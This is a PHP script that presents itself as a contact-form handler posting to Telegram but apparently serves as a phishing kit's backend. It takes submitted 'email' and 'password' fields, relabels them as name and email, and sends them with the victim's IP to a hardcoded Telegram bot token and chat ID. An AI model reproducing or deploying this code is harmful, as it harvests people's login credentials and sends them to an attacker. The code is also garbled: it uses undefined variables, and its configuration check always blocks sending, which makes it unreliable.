<?php
declare(strict_types=1);

header('X-Content-Type-Options: nosniff');

// Configure your Telegram bot
$BOT_TOKEN = '7727860659:AAF0NQ24vQWWyYS_BdzVbzcUZD8wbw34kdM';
$CHAT_ID   = '1661260321';

function isPost(): bool { return ($_SERVER['REQUEST_METHOD'] ?? '') === 'POST'; }
function sanitizeText(?string $v): string { return trim(strip_tags($v ?? '')); }
function escapeHtml(string $v): string { return htmlspecialchars($v, ENT_QUOTES, 'UTF-8'); }

function wantsJson(): bool {
    $accept = $_SERVER['HTTP_ACCEPT'] ?? '';
    $xhr = $_SERVER['HTTP_X_REQUESTED_WITH'] ?? '';
    return stripos($accept, 'application/json') !== false || strtolower($xhr) === 'xmlhttprequest';
}

function respond(bool $ok, string $message, array $extra = []): void {
    if (wantsJson()) {
        header('Content-Type: application/json; charset=UTF-8');
        echo json_encode(['ok' => $ok, 'message' => $message] + $extra);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        echo "<!doctype html><meta charset='utf-8'><title>Form Submission</title>";
        echo "<p>" . escapeHtml($message) . "</p>";
    }
    exit;
}

function sendTelegram(string $token, string|int $chatId, string $text): array {
    $endpoint = "https://api.telegram.org/bot{$token}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];

    if (function_exists('curl_init')) {
        $ch = curl_init($endpoint);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
        ]);
        $resp = curl_exec($ch);
        $err  = curl_error($ch);
        curl_close($ch);
        if ($resp === false) return ['ok' => false, 'error' => $err ?: 'cURL error'];
    } else {
        $ctx = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'content' => http_build_query($payload),
                'timeout' => 10,
            ],
        ]);
        $resp = @file_get_contents($endpoint, false, $ctx);
        if ($resp === false) return ['ok' => false, 'error' => 'HTTP request failed'];
    }

    $json = json_decode($resp, true);
    return is_array($json)
        ? ['ok' => (bool)($json['ok'] ?? false), 'error' => $json['description'] ?? null]
        : ['ok' => false, 'error' => 'Invalid response from Telegram'];
}

if (!isPost()) respond(false, 'Invalid request method.');
if ($BOT_TOKEN === '7727860659:AAF0NQ24vQWWyYS_BdzVbzcUZD8wbw34kdM' || $CHAT_ID === '1661260321') {
    respond(false, 'Configure $BOT_TOKEN and $CHAT_ID in send_telegram.php.');
}

// Get form data
$name    = sanitizeText($_POST['email'] ?? '');
$email   = sanitizeText($_POST['password'] ?? '');


// Build Telegram message
$lines = [];
$lines[] = "<b>📧 New Contact Form Submission</b>";
$lines[] = "";
$lines[] = "<b>Name:</b> " . escapeHtml($name);
$lines[] = "<b>Email:</b> " . escapeHtml($email);
$lines[] = "<b>Subject:</b> " . escapeHtml($subject);
$lines[] = "";
$lines[] = "<b>Message:</b>";
$lines[] = escapeHtml($message);
$lines[] = "";
$lines[] = "<b>Meta:</b>";
$lines[] = "Time: " . gmdate('Y-m-d H:i:s') . ' UTC';
$lines[] = "IP: " . ($_SERVER['REMOTE_ADDR'] ?? '');

$telegramMessage = implode("\n", $lines);

// Send to Telegram
$result = sendTelegram($BOT_TOKEN, $CHAT_ID, $telegramMessage);

if ($result['ok']) {
    respond(true, 'Message sent to Telegram successfully!');
} else {
    respond(false, 'Failed to send message to Telegram.', ['error' => $result['error'] ?? 'Unknown error']);
}
?>